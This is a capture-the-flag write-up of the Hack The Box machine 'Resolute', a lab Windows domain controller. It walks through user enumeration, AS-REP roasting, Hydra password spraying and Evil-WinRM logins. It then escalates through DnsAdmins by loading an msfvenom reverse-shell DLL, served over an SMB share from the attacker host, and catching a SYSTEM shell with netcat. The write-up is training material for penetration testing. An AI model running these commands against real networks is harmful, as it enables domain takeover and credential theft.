---
description: https://www.hackthebox.eu/home/machines/profile/220
---

# Resolute

![](<../../../.gitbook/assets/image (414) (1).png>)

## Nmap

```
nmap 10.10.10.169 -p- -A 
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 13:31 EST
Nmap scan report for 10.10.10.169
Host is up (0.036s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-26 18:39:57Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49951/tcp open  msrpc        Microsoft Windows RPC
62195/tcp open  unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m31s, deviation: 4h37m09s, median: 7m29s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute                                                                                                                                                                                                                
|   NetBIOS computer name: RESOLUTE\x00                                                                                                                                                                                                    
|   Domain name: megabank.local                                                                                                                                                                                                            
|   Forest name: megabank.local                                                                                                                                                                                                            
|   FQDN: Resolute.megabank.local                                                                                                                                                                                                          
|_  System time: 2020-11-26T10:40:49-08:00                                                                                                                                                                                                 
| smb-security-mode:                                                                                                                                                                                                                       
|   account_used: guest                                                                                                                                                                                                                    
|   authentication_level: user                                                                                                                                                                                                             
|   challenge_response: supported                                                                                                                                                                                                          
|_  message_signing: required                                                                                                                                                                                                              
| smb2-security-mode:                                                                                                                                                                                                                      
|   2.02:                                                                                                                                                                                                                                  
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-11-26T18:40:46
|_  start_date: 2020-11-26T13:55:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.54 seconds
```

We have Kerberos, DNS and LDAP running on the server and the nmap smb-os-discovery script has detected OS as Windows Server 2016. We are likely dealing with a domain controller.

We have got the domain name megabnak.local from the smb-os-discovery which will be useful for when we need to enumerate Kerberos.

## SMB

I started off testing null authentication with smbclient and smbmap. Unforutnatley I pulled no results from this.

![](<../../../.gitbook/assets/image (415) (1).png>)

## MSRPC

I was able to connect with rpcclient without any valid credentials.

```
rpcclient -U "" 10.10.10.169
```

From here we can grab users and group information. The user information is exceptionally helpful for us when it comes to enumerating Kerberos.

![](<../../../.gitbook/assets/image (416) (1).png>)

Store the users in a text file and we can these try kerbroating the users.

## Kerberos

Now that we have a list of usernames and the domain name we have enough information to attempt a Kerberoast. We will use Impacket's GetNPUsers.py script.

```
sudo python GetNPUsers.py megabank.local/ -dc-ip 10.10.10.169 -request -usersfile /home/kali/Desktop/users.txt 
```

![](<../../../.gitbook/assets/image (417).png>)

We get no hashes from this. No point in attempting to brute force this many usernames as this will be too slow. We can go back to rpcclient and enumerate further.

Going back through the users I started querying them individually to look for more information and come across an account description for the user 'marko' that hints to a password.

![](<../../../.gitbook/assets/image (418).png>)

I tried these credentials against SMB and Evil-WinRM and did not receive any valid results.

![](<../../../.gitbook/assets/image (419) (1).png>)

## Hydra

We do have a possibility that the Administrator made a mistake and entered the account description regarding the password onto the wrong active directory account.

As we already have a list of users we can run this against Hydra with the password 'Welcome123!'.

```
hydra -L /home/kali/Desktop/users.txt -p Welcome123! smb://10.10.10.169
```

![](<../../../.gitbook/assets/image (420) (1).png>)

At this point I enumerated all readable shares recursively with smbmap and found no interesting information.

## User Shell

We do however, have WinRM open on port 5985 so we can try logging in with Evil-WinRM.

```
evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
```

![](<../../../.gitbook/assets/image (421).png>)

From here we can grab the user flag.

![](<../../../.gitbook/assets/image (422).png>)

At this point I ended up look everywhere for anything to elevate privileges with. Various commands are blocked making it difficult to extract exact system information in order to review for possible vulnerabilities.

Eventually checking the root drive with `dir -ah` we see some hidden folders of which PSTranscripts stands out as being non default.

![](<../../../.gitbook/assets/image (1710).png>)

Moving into the folder and look further again with `dir -ah` for hidden files we see a transcripts file.

![](<../../../.gitbook/assets/image (1711).png>)

We can see in the transcript where the use ryan has attempted to map a drive and used his credentials in plaintext.

![](<../../../.gitbook/assets/image (1712).png>)

The credentials we now have are `ryan:Serv3r4Admin4cc123!`

We can use the credentials again to login with Evil-WinRM:

```
evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169 -s /home/kali/Downloads
```

![](<../../../.gitbook/assets/image (1713).png>)

Viewing the command whoami /all further we see the user ryan is a member of the 'DnsAdmins' group.

![](<../../../.gitbook/assets/image (1714).png>)

This group can be abused to register a malicious DLL in DNS and when executed it gets executed in the context of SYSTEM.

First generate a reverse shell DLL with `msfvenom`.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4455 -f dll > exploit.dll
```

Then set up a `SMB` share using Impacket on the attacking machine to the directory where the `msfvenom` payload resides.

```
sudo python2 smbserver.py Share /home/kali/
```

![](<../../../.gitbook/assets/image (1715).png>)

Then on the target system register a new DNS DLL.

```
dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.18\Share\exploit.dll
```

![](<../../../.gitbook/assets/image (1716).png>)

Then set a `netcat` listener on the attacking machine:

```
sudo nc -lvp 4455
```

We can then stop the DNS service then wait about 30 seconds and start it again.

```
sc.exe stop dns
sc.exe start dns
```

![](<../../../.gitbook/assets/image (1717).png>)

Impacket should recieve connection confrimation on our SMB server.

![](<../../../.gitbook/assets/image (1718).png>)

Then land a SYSTEM shell on `netcat`.

![](<../../../.gitbook/assets/image (1720).png>)
